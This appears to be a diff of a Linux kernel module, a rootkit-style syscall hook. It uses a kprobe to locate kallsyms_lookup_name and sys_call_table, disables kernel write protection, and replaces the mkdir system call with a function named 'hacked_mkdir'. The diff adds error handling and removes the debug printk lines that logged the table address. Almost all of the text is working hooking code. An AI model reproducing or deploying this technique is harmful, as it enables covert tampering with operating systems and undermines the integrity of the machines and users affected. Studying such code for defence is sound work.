@@ -8,9 +8,9 @@
 
 typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
 typedef asmlinkage long (*mkdir_t)(const char *, mode_t);
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 
 static mkdir_t original_mkdir;
-
 static unsigned long *syscall_table = NULL;
 
 static asmlinkage long hacked_mkdir(const char *path, mode_t mode) {
@@ -19,17 +19,16 @@ static asmlinkage long hacked_mkdir(const char *path, mode_t mode) {
 	return 0;
 }
 
-typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-
 static unsigned long *get_syscall_table(void) {
+	int ret = 0;
 	unsigned long *sct = NULL;
 	kallsyms_lookup_name_t lookup_name = NULL;
 	struct kprobe kp = {
 		.symbol_name = "kallsyms_lookup_name"
 	};
 
-	if (register_kprobe(&kp) < 0) {
-		printk("Couldn't register kprobe\n");
+	ret = register_kprobe(&kp);
+	if (ret < 0) {
 		return NULL;
 	}
 
@@ -37,7 +36,6 @@ static unsigned long *get_syscall_table(void) {
 	
 	lookup_name = (kallsyms_lookup_name_t)kp.addr;
 	sct = (unsigned long *)lookup_name("sys_call_table");
-	printk("sys_call_table: %px\n", sct);
 	return sct;
 }
 
@@ -58,15 +56,21 @@ static void enable_write_protection(void) {
 }
 
 int sys_calls_init(void) {
+	int rc = 0;
 
 	disable_write_protection();
+
 	syscall_table = get_syscall_table();
+	if (syscall_table == NULL) {
+		rc = -1;
+		goto out;
+	}
 	original_mkdir = (mkdir_t)syscall_table[__NR_mkdir];
 	syscall_table[__NR_mkdir] = (sys_call_ptr_t)hacked_mkdir;
 
+out:
 	enable_write_protection();
-
-	return 0;
+	return rc;
 }
 
 void sys_calls_cleanup(void) {
